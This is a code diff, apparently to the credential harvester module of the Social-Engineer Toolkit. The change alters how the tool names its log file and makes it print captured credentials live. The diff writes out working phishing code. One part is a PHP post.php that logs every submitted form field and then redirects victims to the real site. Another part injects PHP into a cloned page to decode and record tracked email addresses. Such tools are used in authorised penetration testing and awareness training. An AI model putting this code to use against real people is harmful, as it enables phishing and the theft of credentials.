@@ -4,6 +4,7 @@ import sys
 import os
 import re
 import cgi
+
 # need for python2 -> 3
 try:
     from http.server import *
@@ -494,9 +495,10 @@ def run():
         print("Please note that all output from the harvester will be found under apache_dir/harvester_date.txt")
         print("Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC)
         filewrite = open("%s/post.php" % (apache_dir), "w")
-        now = datetime.datetime.today()
+        now = str(datetime.datetime.today())
+        harvester_file = ("harvester_" + now + ".txt")
         filewrite.write(
-            """<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (now, RAW_URL))
+            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
@@ -527,7 +529,7 @@ def run():
             fileopen = open(setdir + "/web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace(
-                "<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
+                "<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
             filewrite = open(setdir + "/web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
@@ -550,8 +552,15 @@ def run():
                 "NOTE: The URL to click on is index.php NOT index.html with track emails.")
         print_status("All files have been copied to %s" % (apache_dir))
         if attack_vector != 'multiattack':
+            try:
+                print_status("SET is now listening for incoming credentials. You can control-c out of this and completely exit SET at anytime and still keep the attack going.")
+                print_status("All files are located under the Apache web root directory: " + apache_dir)
+                print_status("All fields captures will be displayed below.")
+                print("[Credential Harvester is now listening below...]")
+                tail(apache_dir + "/" + harvester_file)
+            except KeyboardInterrupt:
+                print_status("Exiting the menu - note that everything is still running and logging under your web directory path: " + apache_dir)
             pause = input("{Press return to continue}")
-
 
 class SecureHTTPServer(HTTPServer):
 
